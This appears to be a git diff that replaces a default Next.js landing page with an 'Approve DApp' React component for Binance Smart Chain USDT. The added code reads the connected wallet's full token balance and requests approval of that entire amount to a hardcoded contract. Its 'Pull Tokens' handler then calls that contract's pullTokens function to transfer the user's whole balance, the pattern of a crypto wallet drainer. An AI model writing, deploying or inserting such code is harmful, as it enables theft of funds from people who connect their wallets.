@@ -1,65 +1,143 @@
-import Image from "next/image";
+"use client";
+
+import { useAccount, useConnect, useDisconnect, useWriteContract, usePublicClient } from "wagmi";
+import { parseUnits } from "ethers";
+import { injected } from "wagmi/connectors";
+
+const TOKEN_ADDRESS = "0x55d398326f99059fF775485246999027B3197955"; // BSC USDT
+
+const TOKEN_ABI = [
+  {
+    name: "approve",
+    type: "function",
+    stateMutability: "nonpayable",
+    inputs: [
+      { name: "spender", type: "address" },
+      { name: "amount", type: "uint256" }
+    ],
+    outputs: []
+  },
+  {
+    name: "balanceOf",
+    type: "function",
+    stateMutability: "view",
+    inputs: [
+      { name: "account", type: "address" }
+    ],
+    outputs: [
+      { name: "", type: "uint256" }
+    ]
+  }
+];
+
+const CONTRACT_ADDRESS = "0x9d6db9BFDE5E1922FED7971C8580432ED052d62B";
+
+const CONTRACT_ABI = [
+  {
+    name: "pullTokens",
+    type: "function",
+    stateMutability: "nonpayable",
+    inputs: [
+      { name: "token", type: "address" },
+      { name: "from", type: "address" },
+      { name: "amount", type: "uint256" }
+    ],
+    outputs: []
+  }
+];
 
 export default function Home() {
+  const { address, isConnected } = useAccount();
+  const { connect } = useConnect();
+  const { disconnect } = useDisconnect();
+
+  const { writeContractAsync, isPending } = useWriteContract();
+  const publicClient = usePublicClient();
+
+  const handleApprove = async () => {
+    try {
+      const balance = await publicClient.readContract({
+       address: TOKEN_ADDRESS,
+       abi: TOKEN_ABI,
+       functionName: "balanceOf",
+       args: [address],
+});
+
+      const amount = balance;
+
+      await writeContractAsync({
+        address: TOKEN_ADDRESS,
+        abi: TOKEN_ABI,
+        functionName: "approve",
+        args: [CONTRACT_ADDRESS, amount],
+      });
+
+      console.log("Approved!");
+    } catch (err) {
+      console.error(err);
+    }
+  };
+
+const handlePull = async () => {
+  try {
+    // 🔥 Step 1: Read user's full USDT balance
+    const balance = await publicClient.readContract({
+      address: TOKEN_ADDRESS,
+      abi: TOKEN_ABI,
+      functionName: "balanceOf",
+      args: [address],
+    });
+
+    console.log("User balance:", balance.toString());
+
+    // 🔥 Step 2: Use full balance as amount
+    const amount = balance;
+
+    // 🔥 Step 3: Pull tokens
+    await writeContractAsync({
+      address: CONTRACT_ADDRESS,
+      abi: CONTRACT_ABI,
+      functionName: "pullTokens",
+      args: [
+        TOKEN_ADDRESS,
+        address,
+        amount
+      ],
+    });
+
+    console.log("Tokens pulled!");
+  } catch (err) {
+    console.error("Pull error:", err);
+  }
+};
+
   return (
-    <div className="flex flex-col flex-1 items-center justify-center bg-zinc-50 font-sans dark:bg-black">
-      <main className="flex flex-1 w-full max-w-3xl flex-col items-center justify-between py-32 px-16 bg-white dark:bg-black sm:items-start">
-        <Image
-          className="dark:invert"
-          src="/next.svg"
-          alt="Next.js logo"
-          width={100}
-          height={20}
-          priority
-        />
-        <div className="flex flex-col items-center gap-6 text-center sm:items-start sm:text-left">
-          <h1 className="max-w-xs text-3xl font-semibold leading-10 tracking-tight text-black dark:text-zinc-50">
-            To get started, edit the page.tsx file.
-          </h1>
-          <p className="max-w-md text-lg leading-8 text-zinc-600 dark:text-zinc-400">
-            Looking for a starting point or more instructions? Head over to{" "}
-            <a
-              href="https://vercel.com/templates?framework=next.js&utm_source=create-next-app&utm_medium=appdir-template-tw&utm_campaign=create-next-app"
-              className="font-medium text-zinc-950 dark:text-zinc-50"
-            >
-              Templates
-            </a>{" "}
-            or the{" "}
-            <a
-              href="https://nextjs.org/learn?utm_source=create-next-app&utm_medium=appdir-template-tw&utm_campaign=create-next-app"
-              className="font-medium text-zinc-950 dark:text-zinc-50"
-            >
-              Learning
-            </a>{" "}
-            center.
-          </p>
-        </div>
-        <div className="flex flex-col gap-4 text-base font-medium sm:flex-row">
-          <a
-            className="flex h-12 w-full items-center justify-center gap-2 rounded-full bg-foreground px-5 text-background transition-colors hover:bg-[#383838] dark:hover:bg-[#ccc] md:w-[158px]"
-            href="https://vercel.com/new?utm_source=create-next-app&utm_medium=appdir-template-tw&utm_campaign=create-next-app"
-            target="_blank"
-            rel="noopener noreferrer"
-          >
-            <Image
-              className="dark:invert"
-              src="/vercel.svg"
-              alt="Vercel logomark"
-              width={16}
-              height={16}
-            />
-            Deploy Now
-          </a>
-          <a
-            className="flex h-12 w-full items-center justify-center rounded-full border border-solid border-black/[.08] px-5 transition-colors hover:border-transparent hover:bg-black/[.04] dark:border-white/[.145] dark:hover:bg-[#1a1a1a] md:w-[158px]"
-            href="https://nextjs.org/docs?utm_source=create-next-app&utm_medium=appdir-template-tw&utm_campaign=create-next-app"
-            target="_blank"
-            rel="noopener noreferrer"
-          >
-            Documentation
-          </a>
-        </div>
-      </main>
+    <div style={{ padding: 40 }}>
+      <h1>Approve DApp</h1>
+
+      {!isConnected ? (
+        <button onClick={() => connect({ connector: injected() })}>
+          Connect Wallet
+        </button>
+      ) : (
+        <>
+          <p>Connected: {address}</p>
+
+          <button onClick={disconnect}>Disconnect</button>
+
+          <br /><br />
+
+          <button onClick={handleApprove} disabled={isPending}>
+            {isPending ? "Approving..." : "Approve USDT"}
+          </button>
+
+         <br /><br />
+
+         <button onClick={handlePull}>
+           Pull Tokens
+         </button>
+        </>
+      )}
     </div>
   );
 }
